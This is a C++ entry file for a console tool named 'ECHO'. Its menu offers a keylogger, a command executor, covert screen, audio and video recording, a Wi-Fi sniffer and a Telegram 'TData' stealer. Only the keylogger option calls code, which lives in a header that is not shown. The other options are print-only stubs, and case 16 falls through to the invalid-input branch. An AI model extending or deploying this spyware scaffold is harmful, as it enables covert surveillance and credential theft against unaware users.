#include <iostream>
#include <string>
#include "MainFunctional/KEYLOGGER/keylogger.h"
#include "MainFunctional/KEYLOGGER/main_keylogger.h"

int main() {

    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);

    bool running = true;

    const std::string options =
                                 "WELCOME TO ECHO. CHOOSE THE OPTION:\n"
                                 "[>] 0. - [+] echo                     [<]\n"
                                 "[>] 1. - [+] k3ylogger                [<]\n"
                                 "[>] 2. - [-] Human presence predictor [<]\n"
                                 "[>] 3. - [-] USB watcher              [<]\n"
                                 "[>] 4. - [-] PC data                  [<]\n"
                                 "[>] 5. - [-] CMD executor             [<]\n"
                                 "[>] 6. - [-] Display a message        [<]\n"
                                 "[>] 7. - [-] Open link                [<]\n"
                                 "[>] 8. - [-] Shutdown                 [<]\n"
                                 "[>] 9. - [-] Screenshot               [<]\n"
                                 "[>] 10. - [-] Video recording         [<]\n"
                                 "[>] 11. - [-] Audio recording         [<]\n"
                                 "[>] 12. - [-] Screen recording        [<]\n"
                                 "[>] 13. - [-] Echo ping (Wi-Fi)       [<]\n"
                                 "[>] 14. - [-] Echo WiFi               [<]\n"
                                 "[>] 15. - [-] Echo sniffer            [<]\n"
                                 "[>] 16. - [-] Stiller TData           [<]\n";


    while (running) {
        std::cout << "\n===== MENU =====" << std::endl;
        std::cout << options << std::endl;

        std::string user_input;
        std::cout << "CHOOSE THE OPTION (or type 'exit'): ";
        std::cin >> user_input;

        if (user_input == "exit") {
            running = false;
            break;
        }

        try {
            switch (int choice = std::stoi(user_input)) {
                 case 0: {
                     std::cout << "Echo Engine is working." << std::endl;
                     break;
                 }
                 case 1: {
                     std::cout << "Running Keylogger..." << std::endl;
                     start_keylogger();
                     break;
                 }
                 case 2: {
                     std::cout << "Predicting presence..." << std::endl;
                     break;
                 }
                 case 3: {
                     std::cout << "Running USB watcher..." << std::endl;
                     break;
                 }
                 case 4: {
                     std::cout << "Watch PC data..." << std::endl;
                     break;
                 }
                 case 5: {
                     std::cout << "Running CMD executor" << std::endl;
                     break;
                 }
                 case 6: {
                     std::cout << "Display a message..." << std::endl;
                     break;
                 }
                 case 7: {
                     std::cout << "Open a link..." << std::endl;
                     break;
                 }
                 case 8: {
                     std::cout << "Do u sure u wanna shutdown the ECHO?" << std::endl;
                     break;
                 }
                 case 9: {
                    std::cout << "Take a screenshot" << std::endl;
                     break;
                 }
                 case 10: {
                     std::cout << "Video recording..." << std::endl;
                     break;
                 }
                 case 11: {
                     std::cout << "Audio recording..." << std::endl;
                     break;
                 }
                 case 12: {
                     std::cout << "Screen recording..." << std::endl;
                     break;
                 }
                 case 13: {
                     std::cout << "Echo ping (Wi-Fi)..." << std::endl;
                     break;
                 }
                 case 14: {
                     std::cout << "Echo WiFi..." << std::endl;
                     break;
                 }
                 case 15: {
                     std::cout << "Echo sniffer..." << std::endl;
                     break;
                 }
                 case 16: {
                     std::cout << "Stiller TData..." << std::endl;
                 }
                 default:
                     std::cout << "Invalid input! Please enter a number from 0 to 15." << std::endl;
                     break;
                }
            } catch (std::exception &e) {

            }
    }


    return 0;
}